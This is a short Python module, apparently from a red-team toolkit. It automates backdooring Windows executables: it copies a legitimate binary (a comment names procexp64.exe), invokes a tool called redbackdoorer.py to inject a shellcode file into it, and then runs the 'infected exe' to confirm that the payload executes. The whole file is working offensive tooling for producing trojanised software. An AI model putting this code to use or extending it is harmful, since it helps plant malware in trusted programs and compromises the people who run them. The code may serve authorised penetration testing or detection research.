from helper import *
import shutil


def inject_exe(shc_file, exe_in, exe_out):
    print("--[ Injecting: {} into: {} -> {} ]".format(
        shc_file, exe_in, exe_out
    ))
    shutil.copyfile(exe_in, exe_out)

    # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
    subprocess.run([
        "python3.exe",
        "redbackdoorer.py",
        "1,1",
        shc_file,
        exe_out
    ], check=True,  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def verify_injected_exe(exefile):
    print("---[ Verify infected exe: {} ]".format(exefile))
    # remove indicator file
    pathlib.Path(verify_filename).unlink(missing_ok=True)

    subprocess.run([
        exefile,
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # , check=True
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(verify_filename):
        print("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(verify_filename)
        return True
    else:
        print("---> Verify FAIL. Infected exe does not work (no file created)")
        return False

